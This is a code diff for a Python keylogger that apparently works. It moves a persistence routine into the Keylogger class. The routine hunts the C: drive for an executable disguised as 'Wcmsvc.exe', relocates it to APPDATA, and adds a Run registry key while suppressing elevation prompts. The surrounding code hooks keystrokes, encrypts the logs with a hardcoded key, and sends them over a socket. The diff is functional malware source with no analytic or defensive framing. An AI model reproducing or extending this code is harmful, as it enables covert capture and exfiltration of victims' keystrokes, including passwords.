@@ -10,20 +10,6 @@ PORT = 8888
 LOG_INTERVAL = 10 # seconds
 KEY = b'_AOWbfP5NT6qUsssqqnIEas54V2_XuwzJDJeRwTQORQ='
 
-def setWinRegKey():
-    check = subprocess.Popen("REG query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc", shell=True, stdout=subprocess.PIPE)
-    subprocess_return = check.stdout.read()
-    
-    if "REG_SZ" not in str(subprocess_return):
-        for root, dirs, files in os.walk("C:\\"):
-            if "Wcmsvc.exe" in files:
-                full_path = os.path.join(root, "Wcmsvc.exe")
-                break
-       
-        os.rename(full_path, os.getenv('APPDATA')+'\\Wcmsvc.exe')
-    
-        subprocess.run('cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc /d "'+os.getenv('APPDATA')+'\\Wcmsvc.exe'+'""')
-
 class Keylogger:
     def __init__(self, interval, fernet):
         self.interval = interval
@@ -68,8 +54,23 @@ class Keylogger:
         print("[+] log sent")
         clientSocket.close()
 
+    def setWinRegKey(self):
+        check = subprocess.Popen("REG query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc", shell=True, stdout=subprocess.PIPE)
+        subprocess_return = check.stdout.read()
+    
+        if "REG_SZ" not in str(subprocess_return):
+            for root, dirs, files in os.walk("C:\\"):
+                if "Wcmsvc.exe" in files:
+                    full_path = os.path.join(root, "Wcmsvc.exe")
+                    break
+        
+            os.rename(full_path, os.getenv('APPDATA')+'\\Wcmsvc.exe')
+        
+            subprocess.run('cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc /d "'+os.getenv('APPDATA')+'\\Wcmsvc.exe'+'""')
+
     def start(self):
         try:
+            #self.setWinRegKey()
             keyboard.on_release(callback=self.callback)
             self.report()
             keyboard.wait()
@@ -77,7 +78,6 @@ class Keylogger:
             print("[-] stopping")
 
 if __name__ == "__main__":
-    #setWinRegKey()
     keylogger = Keylogger(interval=LOG_INTERVAL, fernet=Fernet(KEY))
     print("[+] starting")
     keylogger.start()
